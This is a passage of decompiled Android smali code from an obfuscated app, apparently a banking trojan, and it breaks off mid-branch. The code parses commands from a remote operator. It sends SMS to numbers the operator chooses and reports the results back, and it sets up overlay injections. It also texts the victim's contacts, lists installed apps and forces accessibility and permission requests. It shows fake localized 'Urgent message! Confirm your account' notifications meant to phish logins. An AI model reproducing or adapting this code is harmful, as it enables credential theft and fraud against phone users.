    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "getTwitt"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "https://"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_1d

    const-string v4, "http://"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_1e

    :cond_1d
    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v5, "urls"

    invoke-virtual {v4, v1, v5, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_9

    goto :goto_11

    :catch_9
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "ERROR"

    const-string v5, "Class ukhakhcgifofl -> get urls"

    :goto_10
    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_1e
    :goto_11
    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "\u041e\u0431\u0449\u0438\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438"

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "SettingsAll"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    const-string v4, "::"

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    :goto_12
    array-length v5, v3

    if-ge v4, v5, :cond_4b

    aget-object v5, v3, v4

    const-string v6, "|startinj="

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1f

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "name"

    invoke-virtual {v5, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "true"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-nez v5, :cond_1f

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v6, v3, v4

    const-string v7, "|startinj="

    const-string v8, "|endstartinj"

    invoke-virtual {v5, v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "startinj"

    invoke-virtual {v6, v7, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "lock_inj"

    invoke-virtual {v6, v1, v7, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1f
    aget-object v5, v3, v4

    const-string v6, "Send_GO_SMS"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const/16 v6, 0xa

    if-eqz v5, :cond_20

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v7, v3, v4

    const-string v8, "|number="

    const-string v9, "|text="

    invoke-virtual {v5, v7, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aget-object v7, v3, v4

    const-string v8, "text="

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    :try_start_b
    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const/4 v9, 0x1

    aget-object v10, v7, v9

    invoke-virtual {v8, v1, v5, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v10, "4"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "p="

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "|Outgoing SMS"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v14, "Number: "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v14, "Text: "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v14, 0x1

    aget-object v15, v7, v14

    invoke-virtual {v13, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const-string v14, "|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v8, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, ""

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043c\u0441 \u043d\u0430 \u043d\u043e\u043c\u0435\u0440 "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " \u0441 \u0442\u0435\u043a\u0441\u0442\u043e\u043c  "

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v5, 0x1

    aget-object v7, v7, v5

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v8, v9, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v5, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->l(Landroid/content/Context;)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_a

    goto :goto_13

    :catch_a
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v8, "4"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "p="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, "|(Outgoing SMS) Error sending SMS, maybe there are no permission to send!|"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v7, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, ""

    const-string v8, "Error sending SMS, maybe there are no permission to send!"

    invoke-virtual {v5, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_20
    :goto_13
    aget-object v5, v3, v4

    const-string v7, "nymBePsG0"

    invoke-virtual {v5, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const/high16 v7, 0x40000000    # 2.0f

    const/high16 v8, 0x10000000

    if-eqz v5, :cond_21

    new-instance v5, Landroid/content/Intent;

    const-class v9, Lwocwvy/czyxoxmbauu/slsa/ncec/wami;

    invoke-direct {v5, v1, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v9, "str"

    const-string v10, "0"

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v9, "cwc_text"

    const-string v10, ""

    invoke-virtual {v5, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V

    :cond_21
    aget-object v5, v3, v4

    const-string v9, "GetSWSGO"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_22

    new-instance v5, Landroid/content/Intent;

    const-class v9, Lwocwvy/czyxoxmbauu/slsa/ncec/bdxyqqt;

    invoke-direct {v5, v1, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V

    :cond_22
    aget-object v5, v3, v4

    const-string v9, "|telbookgotext="

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_23

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|telbookgotext="

    const-string v11, "|endtextbook"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v9, Landroid/content/Intent;

    const-class v10, Lwocwvy/czyxoxmbauu/slsa/ncec/wami;

    invoke-direct {v9, v1, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "str"

    const-string v11, "1"

    invoke-virtual {v9, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v9

    const-string v10, "cwc_text"

    invoke-virtual {v9, v10, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V

    :cond_23
    aget-object v5, v3, v4

    const-string v9, "getapps"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_24

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Landroid/content/Context;)V

    :cond_24
    aget-object v5, v3, v4

    const-string v9, "getpermissions"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_25

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v5, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;)V

    :cond_25
    aget-object v5, v3, v4

    const-string v9, "startaccessibility"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_26

    :try_start_c
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "startRequest"

    invoke-virtual {v5, v1, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "Access=0"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_26

    const-string v9, "Access=0"

    const-string v10, "Access=1"

    invoke-virtual {v5, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "startRequest"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_b

    goto :goto_14

    :catch_b
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ukhakhcgifofl"

    const-string v10, "Access=0"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_26
    :goto_14
    aget-object v5, v3, v4

    const-string v9, "startpermission"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_27

    :try_start_d
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "startRequest"

    invoke-virtual {v5, v1, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v9, "Perm=0"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_27

    const-string v9, "Perm=0"

    const-string v10, "Perm=1"

    invoke-virtual {v5, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "startRequest"

    invoke-virtual {v9, v1, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_c

    goto :goto_15

    :catch_c
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ukhakhcgifofl"

    const-string v10, "Perm=0"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_27
    :goto_15
    aget-object v5, v3, v4

    const-string v9, "=ALERT|"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_28

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|title="

    const-string v11, "|text="

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aget-object v9, v3, v4

    const-string v10, "text="

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    :try_start_e
    new-instance v10, Landroid/content/Intent;

    const-class v11, Lwocwvy/czyxoxmbauu/slsa/ncec/fyqapyahei;

    invoke-direct {v10, v1, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v11, "title"

    invoke-virtual {v10, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v10, "content"

    const/4 v11, 0x1

    aget-object v9, v9, v11

    invoke-virtual {v5, v10, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startActivity(Landroid/content/Intent;)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_d

    :catch_d
    :cond_28
    aget-object v5, v3, v4

    const-string v9, "=PUSH|"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_29

    :try_start_f
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|title="

    const-string v11, "|text="

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v10, v3, v4

    const-string v11, "|text="

    const-string v12, "|icon="

    invoke-virtual {v9, v10, v11, v12}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    aget-object v10, v3, v4

    const-string v11, "icon="

    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x1

    aget-object v10, v10, v11

    iget-object v11, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v12, "Push Icon"

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, ""

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v11, Landroid/content/Intent;

    const-class v12, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    invoke-direct {v11, v1, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v12, "appname"

    invoke-virtual {v11, v12, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v10

    const-string v11, "title"

    invoke-virtual {v10, v11, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v10, "text"

    invoke-virtual {v5, v10, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v1, v5}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_e

    goto :goto_16

    :catch_e
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v9, "ukhakhcgifofl"

    const-string v10, "ERROR -> PUSH"

    invoke-virtual {v5, v9, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_29
    :goto_16
    aget-object v5, v3, v4

    const-string v9, "startAutoPush"

    invoke-virtual {v5, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_31

    :try_start_10
    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    aget-object v9, v3, v4

    const-string v10, "|AppName="

    const-string v11, "|EndAppName"

    invoke-virtual {v5, v9, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "APP"

    invoke-virtual {v9, v10, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v9

    invoke-virtual {v9}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v9

    iget-object v9, v9, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v9}, Ljava/util/Locale;->toString()Ljava/lang/String;

    move-result-object v9

    const-string v10, "RU"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2a

    const-string v9, "\u0421\u0440\u043e\u0447\u043d\u043e\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435!"

    const-string v10, "\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u0430\u043a\u043a\u0430\u0443\u043d\u0442"

    goto :goto_17

    :cond_2a
    const-string v10, "US"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2c

    :cond_2b
    const-string v9, "Urgent message!"

    const-string v10, "Confirm your account"

    goto :goto_17

    :cond_2c
    const-string v10, "TR"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2d

    const-string v9, "Acil mesaj!"

    const-string v10, "Hesab\u0131n\u0131 onayla"

    goto :goto_17

    :cond_2d
    const-string v10, "DE"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2e

    const-string v9, "Dringende Nachricht!"

    const-string v10, "Best\u00e4tigen Sie ihr Konto"

    goto :goto_17

    :cond_2e
    const-string v10, "IT"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_2f

    const-string v9, "Messaggio urgente!"

    const-string v10, "Conferma il tuo account"

    goto :goto_17

    :cond_2f
    const-string v10, "FR"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v10

    if-eqz v10, :cond_30

    const-string v9, "Message urgent!"

